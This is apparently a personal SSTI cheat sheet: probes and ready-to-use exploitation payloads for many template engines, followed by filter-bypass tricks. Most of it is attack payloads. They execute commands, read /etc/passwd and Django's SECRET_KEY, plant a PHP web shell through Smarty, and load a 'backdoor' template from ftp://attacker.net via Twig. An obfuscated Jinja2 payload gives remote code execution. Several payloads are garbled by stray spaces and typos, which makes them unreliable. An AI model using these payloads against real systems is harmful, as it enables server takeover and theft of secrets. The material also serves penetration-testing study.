# Cheat Sheet testing:
![image](https://github.com/user-attachments/assets/d7f5bf06-7269-46a3-8d2b-419688fdb68d)
```
Jinja2 (Python Flask/Django): {{ 7*7 }}  
Freemarker (Java):             ${7*7}  
Velocity (Java):          #set($a = 7*7)${a} 
Thymeleaf (Java):              ${7*7}  
Twig (PHP Symfony):           {{ 7*7 }}  
Smarty (PHP):                  {$7*7}  
Mako (Python):                 ${7*7}
ERB (Ruby):                  <%= 7*7 %>
Smarty:                    a{*comment*}b
```
![Pasted image 20250408092652.png](/mnt/c/Users/kolbe/OneDrive/Obsidian Vault/Cybersecurity/ScreenshotsPasted%20image%2020250408092652.png)
- When the template engine is confirmed, you can replace the `7*7` with commands from the corresponding template engine

## SSTI Polygot
```
${{<%[%'"}}%\.
```

## FreeMarker (Java):
```
${7*7}=49
```
```
<#assign command="freemarker template utility.Execute"?new()> ${ command("cat /etc/passwd") }
```

## Java:
```
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("") .getPath()}
${class.getResource(" .. / .. / .. / .. / .. /index.htm") .getContent()}
${T(java. lang. System) . geteny ( ) }
${product.getClass() .getProtectionDomain().getCodeSource().getLocation().toURI().re
solve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```
## Twig (PHP):
```
{{7*7}}
{{7*'7'}}
{{dump (app)}}
{{app. request. server. all| join(',') }}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```
## Smarty (PHP) :
```
{$smarty.version}
{php}echo `id ; {/php}
{Smarty_Internal_Write_File :: writeFile($SCRIPT_NAME," <? php passthru ($_GET['cmd' ]);
?>",self: : clearConfig())}
```
## Handlebars (NodeJS) :
```
wrtz{{#with "s" as | string| }}
{ {#with "e"}}
{{#with split as
{{this.pop} }
{{this.push (lookup string. sub "constructor" ) } }
{{this.pop}}
{{#with string.split as | codelist| }}
{{this.pop}}
{{this.push "return require('child_process' ) . exec ( 'whoami' ); "}}
{ {this.pop} }
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{ {/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
## Velocity:
```
#set($str=$class.inspect("java.lang.String").type)
#set ($chr=$class.inspect("java.lang.Character") .type)
#set ($ex=$class.inspect("java.lang.Runtime") .type.getRuntime() .exec ("whoami"))
$ex.waitFor ()
#set ($out=$ex.getInputStream())
#foreach($i in [1 .. $out.available() ])
$str.valueOf($chr.toChars ($out.read()))
#end
```

## ERB (Ruby) :
```
<%= system("whoami" ) %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file' ) .read %>
```

## Django Tricks (Python):
```
{% debug %}
{{settings.SECRET_KEY} }
```

## Tornado (Python) :
```
{% import foobar %} = Error
{% import os %} { {os. system ( 'whoami' ) } }
```

## Mojolicious (Perl) :
```
<%= perl code %>
<% perl code %>
```
## Flask/Jinja2: Identify:
```
{{ '7'*7 }}
{{ [].class.base. subclasses () }} # get all classes
{{''.class.mro() [1].subclasses()}}
{%for c in [1,2,3] %}{ {c.c.c}}{% endfor %}
```

## Flask/Jinja2:
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

## Jade:
```
#{root.process.mainModule.require('child_process') . spawnSync('cat', ['/etc/passwd']) .stdout}
```

## Razor (.Net) :
```
@(1+2)
@{// C# code}
```

### Bypassing filters
#### Blocking: `.`
- (`.`) → Uses `|attr()` to dynamically access attributes:  
```
request.application.__globals__  TURNS INTO: request|attr(‘application’)|attr(“__globals__”)
```

#### Blocking: `__`
- Hex Encoding (`\x5f`) for Underscores (`_`)

#### Blocking: `[]`
- Using `__getitem__()` Instead of `[]`

#### RCE Without `eval()` or `exec()`  
```
__import__(‘os’).popen(‘id’).read()  
```
- Avoids blocked `os.system()` and `subprocess.Popen()`.

#### Example payloads:
Payload to commit RCC (in jinja):
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
- Executes the `id` command
